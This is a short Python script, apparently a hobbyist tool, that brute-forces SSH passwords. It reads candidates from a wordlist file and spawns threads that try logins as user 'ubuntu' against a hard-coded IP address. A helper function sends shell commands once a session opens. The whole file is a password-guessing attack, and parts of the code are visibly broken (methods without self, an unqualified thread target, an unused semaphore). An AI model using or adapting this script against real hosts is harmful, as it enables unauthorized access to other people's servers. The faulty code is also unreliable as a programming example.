#! /usr/bin/python3
from pexpect import pxssh
from threading import *
import sys

Time = 0
maxThread = 5
connection_lock = BoundedSemaphore(value=maxThread)

class module:
    def connect(user,pw,host):
        global Time
        try:
            conn = pxssh.pxssh()
            conn.login(host,user,pw)
            Time += 1
            print('[+] time %s to try, password found !!! (%s)'%(Time,pw))
        except:
            Time += 1
            print('[-] time %s to try,fail -_-|'%Time)
        return conn
    
    def cmdExec(conn,cmd):
        conn.sendline(cmd)
        conn.prompt()
        print(conn.before.decode('ascii'))
        return conn
    
    def main(self):
        user = 'ubuntu'
        host = '123.206.13.128'
        pws = open('pw.txt','r')
    
        while True:
            pw = pws.readline().strip()
            if pw == '':
                break
            t = Thread(target=connect,args=(user,pw,host))
            ssh = t.start()
